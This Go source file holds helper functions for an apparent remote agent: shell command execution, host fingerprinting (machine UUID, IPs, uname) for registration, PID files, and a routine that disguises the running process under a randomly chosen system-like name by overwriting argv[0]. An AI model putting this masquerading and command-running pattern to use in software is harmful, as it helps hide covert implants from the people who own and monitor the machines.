package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unsafe"
)

// Constants for seconds
const (
	oneMinute        = 60
	fiveMinutes      = 300
	fifteenMinutes   = 900
	thirtyMinutes    = 1800
	fortyfiveMinutes = 2500
	oneHour          = 3600
	threeHours       = 10800
)

// Generate random value between two values
func randomBetween(min, max int) int {
	rand.New(rand.NewSource(time.Now().Unix()))
	return rand.Intn(max-min) + min
}

// Generate random name from the list of potential names
func randomProcessName(namesList []string) string {
	rand.New(rand.NewSource(time.Now().Unix()))
	n := rand.Int() % len(namesList)
	return namesList[n]
}

// Helper to get string environment variables
func getClientEnvStr(key, fallback string) string {
	if value, ok := os.LookupEnv(key); ok {
		return value
	}
	return fallback
}

// Helper to get numeric environment variables
func getClientEnvInt(key string, fallback int) int {
	if value, ok := os.LookupEnv(key); ok {
		intValue, err := strconv.Atoi(value)
		if err != nil {
			return 0
		}
		return intValue
	}
	return fallback
}

// Helper to get boolean environment variables
func getClientEnvBool(key string, fallback bool) bool {
	if _, ok := os.LookupEnv(key); ok {
		return true
	}
	return fallback
}

// Helper to set the process name, depending of the OS
func setProcessName() {
	switch os := runtime.GOOS; os {
	case "darwin":
		processName = randomProcessName(PotentialNamesOSX)
	case "linux":
		processName = randomProcessName(PotentialNamesUnix)
	case "freebsd":
		processName = randomProcessName(PotentialNamesUnix)
	case "windows":
		processName = randomProcessName(PotentialNamesWindows)
	}
	err := modifyArgZero(processName)
	if err != nil && !_silence {
		log.Println(err)
	}
	if printDebug && !_silence {
		log.Println("STZ_DEBUG: My name is " + processName)
	}
}

// Helper that modifies argv[0] and makes the process name to change
func modifyArgZero(name string) error {
	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
	n := copy(argv0, name)
	if n < len(argv0) {
		argv0[n] = 0
	}
	return nil
}

// Helper to create a PID file in the specified location
func writePidFile(rootPidFile, tmpPidFile string) {
	// Get PID from running process
	_pid := os.Getpid()
	if printDebug && !_silence {
		log.Println("STZ_DEBUG: My PID is ", _pid)
	}
	b := []byte(strconv.Itoa(_pid))
	// Attempt to create and write to file as root
	err := os.WriteFile(rootPidFile, b, 0644)
	createdPidFile := rootPidFile
	// If it fails, create pid file for non-root
	if err != nil {
		err := os.WriteFile(tmpPidFile, b, 0644)
		if err != nil && !_silence {
			log.Println(err)
		}
		createdPidFile = tmpPidFile
	}
	if printDebug && !_silence {
		log.Println("STZ_DEBUG: Created pidfile in " + createdPidFile)
	}
}

// Helper to run a command
func run(command string) string {
	var shell, param string
	switch os := runtime.GOOS; os {
	case "windows":
		shell = "cmd.exe"
		param = "/c"
	default:
		shell = "sh"
		param = "-c"
	}
	out, err := exec.Command(shell, param, command).CombinedOutput()
	if printDebug && !_silence {
		log.Println("STZ_DEBUG: Executed " + command)
	}
	if err != nil && !_silence {
		_, _ = os.Stderr.WriteString(err.Error())
	}
	return string(out)
}

// Helper to clean up a uuid string from spaces, newlines and dashes, and makes it lowercase
func trim(str string) string {
	return strings.ToLower(strings.Replace(strings.TrimSpace(strings.Trim(str, "\n")), "-", "", -1))
}

// Helper to read and clean up the contents of a file
func readFile(path string) (string, error) {
	buf, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return trim(string(buf)), nil
}

// Helper to get the output of uname/ver for agent registration
func getUname() string {
	uname := "uname -a"
	if runtime.GOOS == "windows" {
		uname = "ver"
	}
	return run(uname)
}

// Helper to get the IP addresses from all interfaces, that aren't loopback
func getIPs() []string {
	ips := []string{}
	addrs, err := net.InterfaceAddrs()
	if err != nil && !_silence {
		if printDebug && !_silence {
			log.Println("STZ_DEBUG: Can not get network interfaces ", err)
			return ips
		}
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	return ips
}

// Helper to generate a random UUID without an external dependecy
func randUUID() string {
	b := make([]byte, 16)
	rand.New(rand.NewSource(time.Now().UnixNano()))
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

// Helper to get system UUID
func getUUID() string {
	var uuid string
	switch os := runtime.GOOS; os {
	case "windows":
		uuidCmd := "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid"
		uuid = trim(run(uuidCmd))
	case "linux":
		uuid, _ = readFile("/var/lib/dbus/machine-id")
		// Fedora 20 is missing that file
		if uuid == "" {
			uuid, _ = readFile("/etc/machine-id")
		}
	case "freebsd":
		uuid, _ = readFile("/etc/hostid")
		if uuid == "" {
			uuid = trim(run("kenv -q smbios.system.uuid"))
		}
	//netbsd
	//solaris
	//openbsd
	//dragonfly
	//solaris
	case "darwin":
		uuid = trim(run("ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | cut -d'\"' -f4"))
	}
	if uuid == "" {
		return randUUID()
	}
	return uuid
}
